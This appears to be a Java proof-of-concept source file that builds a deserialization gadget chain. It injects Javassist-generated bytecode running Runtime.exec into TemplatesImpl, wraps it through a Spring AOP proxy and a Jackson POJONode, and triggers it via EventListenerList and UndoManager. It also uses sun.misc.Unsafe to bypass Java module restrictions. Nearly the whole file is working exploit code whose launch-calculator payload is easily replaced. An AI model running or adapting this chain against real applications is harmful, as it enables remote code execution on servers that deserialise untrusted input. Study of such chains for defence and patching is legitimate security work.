package org.example;

import com.sun.org.apache.bcel.internal.Repository;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.CtNewConstructor;
import sun.misc.Unsafe;
import javax.swing.event.EventListenerList;
import javax.swing.undo.CompoundEdit;
import javax.swing.undo.UndoManager;
import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.*;
import java.util.Base64;
import java.util.Vector;

// --add-opens java.base/java.lang=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.xpath.internal.objects=ALL-UNNAMED --add-opens java.base/java.util=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.bcel.internal=ALL-UNNAMED --add-opens java.xml/com.sun.org.apache.bcel.internal.classfile=ALL-UNNAMED
public class Main4 {
    public static String base64Serial(Object o) {
        try {
            ByteArrayOutputStream barr = new ByteArrayOutputStream();
            (new ObjectOutputStream(barr)).writeObject(o);
            return Base64.getEncoder().encodeToString(barr.toByteArray()).toString();
        } catch (Exception e) {
            System.out.println("Error: " + e);
            return "Failed";
        }
    }

    public static Object base64DeSerial(String base64) throws Exception {
        byte[] decode = Base64.getDecoder().decode(base64);
        ByteArrayInputStream bin = new ByteArrayInputStream(decode);
        ObjectInputStream objectInputStream = new ObjectInputStream(bin);
        return objectInputStream.readObject();
    }

    public static void fileSerial(Object o) {
        try {
            FileOutputStream barr = new FileOutputStream("ser.bin");
            (new ObjectOutputStream(barr)).writeObject(o);
        } catch (Exception e) {
            System.out.println("Error: " + e);
        }

    }

    public static Object fileDeSerial() {
        try {
            FileInputStream fileInputStream = new FileInputStream("ser.bin");
            ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
            return objectInputStream.readObject();
        } catch (Exception e) {
            System.out.println("Error: " + e);
            return "Failed";
        }
    }

    public static void deSerial(Object o) throws Exception {
        base64DeSerial(base64Serial(o));
    }
    static Unsafe unsafe;

    static {
        try {
            // 通过反射得到theUnsafe对应的Field对象
            Field field = Unsafe.class.getDeclaredField("theUnsafe");
            // 设置该Field为可访问
            field.setAccessible(true);
            // 通过Field得到该Field对应的具体对象，传入null是因为该Field为static的
            unsafe = (Unsafe) field.get(null);
        } catch (Exception e) {
            System.out.println("Error: " + e);
        }

    }

    public static Unsafe getUnsafe() throws Exception {
        // 通过反射得到theUnsafe对应的Field对象
        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        // 设置该Field为可访问
        field.setAccessible(true);
        // 通过Field得到该Field对应的具体对象，传入null是因为该Field为static的
        unsafe = (Unsafe) field.get(null);
        return unsafe;
    }

    public static void setObject(Object o, Field field, Object value) {
        unsafe.putObject(o, unsafe.objectFieldOffset(field), value);
    }
    public static Object getObject(Object o, Field field) {
        return  unsafe.getObject(o, unsafe.objectFieldOffset(field));
    }
    public static Object newClass(Class c) throws InstantiationException {
        Object o = unsafe.allocateInstance(c);
        return o;
    }

    public static void bypassModule(Class src, Class dst) throws Exception {
        Unsafe unsafe = getUnsafe();
        long addr = unsafe.objectFieldOffset(Class.class.getDeclaredField("module"));
        unsafe.getAndSetObject(src, addr, unsafe.getObject(dst,unsafe.objectFieldOffset(Class.class.getDeclaredField("module"))));


    }
    public static byte[] getObjectBytes(Class o) throws Exception {
        return Repository.lookupClass(o).getBytes();
    }
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass ctClass3= pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
        CtMethod writeReplace = ctClass3.getDeclaredMethod("writeReplace");
        ctClass3.removeMethod(writeReplace);
        ctClass3.toClass();
        CtClass ctClass = pool.makeClass("Calc");

        ctClass.addConstructor(
                CtNewConstructor.make("public Calc() { Runtime.getRuntime().exec(\"calc\"); }", ctClass)
        );
        CtClass ctClass1 = pool.makeClass("Foo");

        byte[] bytecode = ctClass.toBytecode();
        byte[] bytecode1 = ctClass1.toBytecode();

        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Object templates = newClass(aClass);
        setObject(templates, aClass.getDeclaredField("_name"), "n1ght");

        setObject(templates, aClass.getDeclaredField("_sdom"), new ThreadLocal());
        setObject(templates, aClass.getDeclaredField("_tfactory"), newClass(Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl")));
//        setObject(templates, aClass.getDeclaredField("_bytecodes"), new byte[][] {bytecode, bytecode1});
        setObject(templates, aClass.getDeclaredField("_bytecodes"), new byte[][] {bytecode, bytecode1});
//        setObject(templates, aClass.getDeclaredField("_bytecodes"), new byte[][] {TomcatEcho.testCalc()});
        Class<?> jdkDynamicAopProxy = Class.forName("org.springframework.aop.framework.JdkDynamicAopProxy");
        Class<?> advisedSupport = Class.forName("org.springframework.aop.framework.AdvisedSupport");
        Constructor<?> constructor = jdkDynamicAopProxy.getConstructor(advisedSupport);
        constructor.setAccessible(true);
        Object advisedSupport1 = advisedSupport.newInstance();
        Method setTarget = advisedSupport1.getClass().getMethod("setTarget", Object.class);
        setTarget.invoke(advisedSupport1, templates);
        InvocationHandler invocationHandler = (InvocationHandler)constructor.newInstance(advisedSupport1);
        Object proxy = Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Templates.class}, invocationHandler);

        Class<?> name = Class.forName("com.fasterxml.jackson.databind.node.POJONode");
        Constructor<?> constructor1 = name.getConstructor(Object.class);
        Object node = constructor1.newInstance(proxy);
//        Object node = constructor1.newInstance(templates);
//        JSONObject jsonObject = new JSONObject();
//        jsonObject.put("aaa",proxy);
        EventListenerList list2 = new EventListenerList();
        UndoManager manager = new UndoManager();
        Vector vector = (Vector) getObject(manager, CompoundEdit.class.getDeclaredField("edits"));
        vector.add(node);
//        vector.add(jsonObject);
        setObject(list2, EventListenerList.class.getDeclaredField("listenerList"), new Object[]{InternalError.class, manager});
//        proxy.toString();
        String s = base64Serial(list2);
        System.out.println(s);
        Object o = base64DeSerial(s);
    }
}



